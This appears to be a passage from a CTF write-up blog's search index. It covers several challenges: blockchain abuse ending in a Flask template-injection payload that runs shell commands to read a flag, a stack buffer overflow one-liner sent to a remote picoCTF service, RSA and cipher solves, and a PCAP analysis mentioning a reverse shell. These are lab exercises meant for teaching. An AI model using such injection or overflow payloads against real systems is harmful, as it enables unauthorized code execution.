LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 1338  If the bot replies with another transaction, we should mine the new block:\nBlockchain\u0026gt; mine [+] Mining!  And we get another HTTP response in Burp Suite:\nNow we have two more coins. We can also view the received data using transactions and specifying the block index:\n[+] Done! - New Block Forged (5) Blockchain\u0026gt; wallet show [+] Address: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 1340 Blockchain\u0026gt; transactions Enter Block Index\u0026gt; 5 ------------------------------ From:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1 Data:\tMinimum Amount not met! (= 1,000,000) ------------------------------ From:\t0 To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1 Data: ------------------------------  We guess that we need to send one million coins to achieve something.\nBecoming millionaire So, let\u0026rsquo;s do another transaction with a negative value so that we have enough coins:\nBlockchain\u0026gt; transaction Enter Recipient\u0026gt; Amount\u0026gt; -100000000 Enter Data\u0026gt; Millionaire [+] Sent Transaction: Transaction will be added to Block 6 Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (6) Blockchain\u0026gt; wallet show [+] Address: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== [+] Balance: 100001341  Alright, now we need to make a transaction of one million coins to pass the limit:\nBlockchain\u0026gt; transaction Enter Recipient\u0026gt; LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount\u0026gt; 1000001 Enter Data\u0026gt; Hi bot [+] Sent Transaction: Transaction will be added to Block 7 Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (7) Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (8)  After mining our transaction and the bot\u0026rsquo;s transaction, we can see in Burp Suite that our input data is reflected in the response:\nWe can visualize it from the CLI too:\nBlockchain\u0026gt; transactions Enter Block Index\u0026gt; 8 ------------------------------ From:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1000001 Data:\tHello From LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3...! You said: Hi bot ------------------------------ From:\t0 To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1 Data: ------------------------------  SSTI exploitation This fact encourages to test some payloads for Server-Side Template Injection (SSTI), because usually SSTI appears in challenges related to Flask. For instance, we can send {{7*7}} and check if we see 49:\nBlockchain\u0026gt; transaction Enter Recipient\u0026gt; LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount\u0026gt; 1000001 Enter Data\u0026gt; {{7*7}} [+] Sent Transaction: Transaction will be added to Block 9 Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (9) Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (10)  And there we have it:\nBlockchain\u0026gt; transactions Enter Block Index\u0026gt; 10 ------------------------------ From:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1000001 Data:\tHello From LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3...! You said: 49 ------------------------------ From:\t0 To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1 Data: ------------------------------  At this point, we can inject Python code in order to get Remote Code Execution (RCE). In PayloadsAllTheThings we can find the following payload to execute a system command:\n{{ cycler.__init__.__globals__.os.popen('id').read() }}  Flag So let\u0026rsquo;s enter cat /app/flag.txt in order to get the flag:\nBlockchain\u0026gt; transaction Enter Recipient\u0026gt; LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount\u0026gt; 1000001 Enter Data\u0026gt; {{ cycler.__init__.__globals__.os.popen('cat /app/flag.txt').read() }} [+] Sent Transaction: Transaction will be added to Block 11 Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (11) Blockchain\u0026gt; mine [+] Mining! [+] Done! - New Block Forged (12) Blockchain\u0026gt; transactions Enter Block Index\u0026gt; 12 ------------------------------ From:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FDZzN5RXgxckpaSTlaL1FYUDhkbFVDTnhwKwovSmtzYU5qY3dvbXcydmQwSFZBWEcyRmtPbm82V3VsaGZhRHNseVFYV2JjRjFQcmZoUGFPSlROMTBkQ3lSa0JrCnJ1TlA4NnRMYUFQVnYvWnJObVpxSzhxSGZBRThvaG9tbWFnRkQ2NDlpVG5lNUdyV211TWJ1N3NiYmNXcWl6RnkKVjZKOGRZRU9JQUpUTU9Ra3V3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1000001 Data:\tHello From LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3...! You said: HTB{w34k_Rs4_4nD_T3mPl4t3s___Wh4t_h4s_tH3_w0R1d_c0m3_t0?!?} ------------------------------ From:\t0 To:\tLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FEcnJzbjkzTWxoSE1qTVNHWTc5bjhuVWozUwpSQm82SmYwMVpOSTExaGREejFWY2xlSGIrZ0xIVEFmZXM2TFFGeWpEa1VLdWlHZDRYblprOVRWd1pMUDM5NjQ1ClRFVHhETENFbDJEWE9rQWZhMFZWSGd4MTh3NnVEZm42ZGcvRXgxSnBmYW5WNkRTTGF2dnFWamYvUW8ydmRiK2YKTE9IQ2E0SkwrNng3SHVsRlNRSURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQ== Amount:\t1 Data: ------------------------------  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/misc/chainsmoker/","section":"ctf","summary":"Blockchain. Integer operations. Server-Side Template Injection","time":7,"title":"Chainsmoker"},{"contents":"We are given these characters:\n43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D  Since they are numbers and letters between A and F, they seem to be ASCII characters in hexadecimal representation.\nFor instance, 0x43 is the code for C, 0x54 for T and 0x46 for F.\nTo decode all the characters, we can use the following \u0026ldquo;one-liner\u0026rdquo;:\n$ xxd -r -p \u0026lt;\u0026lt;\u0026lt; '43 54 46 6C 65 61 72 6E 7B 34 35 43 31 31 5F 31 35 5F 55 35 33 46 55 4C 7D' CTFlearn{45C11_15_U53FUL}  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/ctflearn/cryptography/character-encoding/","section":"ctf","summary":"ASCII hexadecimal encoding","time":1,"title":"Character Encoding"},{"contents":"We are given a PCAP file with some HTTP messages and TCP segments:\nIf we filter by HTTP protocol, we will see some requests and responses:\nWe might think that the cyber criminal found a remote file upload vulnerability and uploaded cmd.aspx and then uploaded nc64.exe to execute commands. Actually, we can see that the cyber criminal got a reverse shell on the Windows host:\nAt the end of the PCAP capture, we see that the cyber criminal tries to access a file named JBKEE62NIFXF6ODMOUZV6NZTMFGV6URQMNMH2IBA.txt and it shows Hey there!:\nThe key here is that the filename is encoded. If we enter it in CyberChef with Magic recipe, we will see that it is encoded in Base32, and it is the flag (HTB{MAn_8lu3_73aM_R0cX} ):\n","image":"/images/forensics.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/forensics/chase/","section":"ctf","summary":"HTTP and TCP traffic analysis","time":1,"title":"Chase"},{"contents":"We are given a ciphertext:\nalp gwcsepul gtavaf, nlv prgpbpsu mb h jcpbyvdlq, ipltga rv glniypfa we ekl 16xs nsjhlcb. px td o lccjdstslpahzn fptspf xstlxzi te iosj ezv sc xcns ttsoic lzlvrmhaw ez sjqijsa xsp rwhr. tq vxspf sciov, alp wsphvcv pr ess rwxpqlvp nwlvvc dyi dswbhvo ef htqtafvyw hqzfbpg, ezutewwm zcep xzmyr o scio ry tscoos rd woi pyqnmgelvr vpm . qbctnl xsp akbflowllmspwt nlwlpcg, lccjdstslpahzn fptspfo oip qvx dfgysgelipp ec bfvbxlrnj ojocjvpw, ld akfv ekhr zys hskehy my eva dclluxpih yoe mh yiacsoseehk fj l gebxwh sieesn we ekl iynfudktru. xsp yam zd woi qwoc.  We can use a cipher-identifier to detect that we are dealing with Vigenère cipher:\nIn the same website, we have a vigenere-cipher tool that is able to guess the plaintext and the key:\nSo the flag is: HTB{helloworld}.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/htb-challenges/crypto/classic-yet-complicated/","section":"ctf","summary":"Vigenère cipher","time":1,"title":"Classic, yet complicated!"},{"contents":"We are told that some RSA implementation uses a prime number and the next prime number. We are also given the ciphertext:\n4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017  We got the source code as well:\nfrom Crypto.Util.number import getPrime, bytes_to_long from Crypto.PublicKey import RSA from secret import flag, getNextPrime p = getPrime(1024) q = getNextPrime(p) n = p * q e = 65537 key = RSA.construct((n, e)).export_key().decode() with open(\"key\", \"w\") as f: f.write(key) m = bytes_to_long(flag.encode()) c = pow(m, e, n) print(f\"c = {c}\")  Notice that we don\u0026rsquo;t have function getNextPrime. Moreover, we are given the public key in PEM format:\n-----BEGIN PUBLIC KEY----- MIIBITANBgkqhkiG9w0BAQEFAAOCAQ4AMIIBCQKCAQBKS/xOueb8SyhYskLwm2DT hofceXDq73pNlu7CAwf1rTYFfYUgbiaKqkOfyTDurLOVXhWnwcmCRo9HwUUEyHG3 swXS5OoSGmHHplMv8crTLlY+/hCpEFnLSPDcnl7HI7a/oprKpCgeiZOphEiIhm8x UQqivWqZvGzeV9EfjeaAaPlztu3nuRyfccMjqozreU20f8SNSa9wD6vKqtAgvjv3 VapvlRVHRfPvlWCr09VE8W1qzdWvk0XWnyihd+3ssCgKBXpirylAT1WWZk6d3Ryq bh7biTpeVqzovEFZpQrm2T8Ym6TMRkbImLo9ObEOyVvP3TyUOUtalgDh1iaqHWkn AgMBAAE= -----END PUBLIC KEY-----  We can extract $n$ and $e$ from that file (although we already know that $e = 65537$). Then the idea is to compute $\\sqrt{n}$ because we know that $n = p \\cdot q$ and $p$ and $q$ are so close (we can guess that are consecutive prime numbers).\nSo, once $\\sqrt{n}$ is computed, we can start decreasing the result until we find a prime number. After that, we just need to increase it to find the next prime number.\nOnce we have prime numbers $p$ and $q$, the RSA decryption is trivial.\nHere we have a Python script that solves the challenge:\n#!/usr/bin/env python3 from Crypto.Util.number import isPrime from Crypto.PublicKey import RSA from gmpy2 import iroot c = 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017 with open('key') as f: key = RSA.import_key(f.read()) n = key.n e = key.e def get_next_prime(prime: int) -\u0026gt; int: test = prime + 2 while not isPrime(test): test += 2 return test while True: p, _ = iroot(n, 2) while not isPrime(p): p -= 2 q = get_next_prime(p) n = p * q phi_n = (p - 1) * (q - 1) d = pow(e, -1, phi_n) p = pow(c, d, n) if b'SEE{'.hex() in hex(p): print(bytes.fromhex(hex(p)[2:]).decode()) break  $ python3 solve.py SEE{i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e}  The full script can be found in here: solve.py.\n","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/en/ctf/other/close-enough/","section":"ctf","summary":"SEETF 2022. RSA. Wrong implementation","time":2,"title":"Close Enough"},{"contents":"We are given a 64-bit binary called chall:\nArch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)  We also have the C source code. Basically, what the program does is call function gets and after that compare a local variable (code) with the value of a global variable (GOAL):\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define SIZE 0x100 #define GOAL 0xdeadbeef const char* HEADER = \"...\"; int main() { long code = 0; char clutter[SIZE]; setbuf(stdout, NULL); setbuf(stdin, NULL); setbuf(stderr, NULL); puts(HEADER); puts(\"My room is so cluttered...\"); puts(\"What do you see?\"); gets(clutter); if (code == GOAL) { printf(\"code == 0x%llx: how did that happen??\\n\", GOAL); puts(\"take a flag for your troubles\"); system(\"cat flag.txt\"); } else { printf(\"code == 0x%llx\\n\", code); printf(\"code != 0x%llx :(\\n\", GOAL); } return 0; }  The idea is simple: gets is vulnerable to Buffer Overflow, so we can write values on the stack. That way, we can overwrite the value of variable code:\nLet\u0026rsquo;s debug it with GDB:\n$ gdb -q chall Reading symbols from chall... (No debugging symbols found in chall) gef➤ disassemble main ... 0x000000000040074c : call 0x4005d0 \u0026lt;gets@plt\u0026gt; 0x0000000000400751 : mov eax,0xdeadbeef 0x0000000000400756 : cmp QWORD PTR [rbp-0x8],rax 0x000000000040075a : jne 0x40078c \u0026lt;main+197\u0026gt; ... End of assembler dump.  We see that the local variable code is stored in $rbp - 0x8. So, let\u0026rsquo;s find the offset to reach register $rbp using a pattern string. We must use a string longer than 256 bytes (0x100), which is the length of the buffer shown in the source code:\ngef➤ pattern create 300 [+] Generating a pattern of 300 bytes (n=8) aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa [+] Saved as '$_gef0' gef➤ run Starting program: ./chall My room is so cluttered... What do you see? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaa aauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaa code == 0x6261616161616169 code != 0xdeadbeef :( Program received signal SIGSEGV, Segmentation fault. 0x00000000004007c0 in main ()  gef➤ pattern offset $rbp [+] Searching for '$rbp' [+] Found at offset 272 (little-endian search) likely  Perfect, we need 272 bytes to control $rbp. Thus, we need 264 (272 - 8) to reach the variable we want to modify. After the 264 characters, we must put 0xdeadbeef in little-endian format to pass the check and read the flag:\n$ (python3 -c 'import sys; sys.stdout.write(\"A\" * 264)'; echo -e '\\xef\\xbe\\xad\\xde') | ./chall ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \\^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \\ ^ _ ^ / | | \\^ ^| | ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | // | /_\\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \\|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\\@@@@@/!\\|| _'______________.'|== ===== |\\|______|===============|________________|/|\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \" ||\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"||\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"''\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"''\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" \"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles cat: flag.txt: No such file or directory  Nice, let\u0026rsquo;s send the payload to the remote instance:\n$ (python3 -c 'import sys; sys.stdout.write(\"A\" * 264)'; echo -e '\\xef\\xbe\\xad\\xde') | nc mars.picoctf.net 31890 ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ 